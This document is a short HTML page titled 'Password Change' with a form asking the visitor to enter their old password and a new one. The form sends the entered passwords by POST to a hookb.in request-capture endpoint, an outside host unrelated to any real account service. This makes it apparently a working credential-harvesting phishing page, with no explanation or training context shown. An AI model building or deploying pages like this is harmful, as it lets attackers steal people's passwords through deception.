<!doctype html>
<html lang="en">
<head>

          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Password Change</title>
</head>
<body>
    <h1>Please Update your password below</h1>

    <form action="https://hookb.in/vaP3a5Ga" method="POST">
        <div>
            <label for="old_pass">Enter old password:
                <input type="password" id="old_pass" name="old_pass" placeholder="*required">
            </label>
            <label for="new_pass">Enter new password:
                <input type="password" id="new_pass" name="new_pass" placeholder="*required">
            </label>
            <label for="new_pass_confirm">Confirm new password:
                <input type="password" id="new_pass_confirm" name="new_pass_confirm" placeholder="*required">
            </label>
        </div>
        <div>
            <button type="submit">Submit</button>
        </div>
    </form>

</body>
</html>
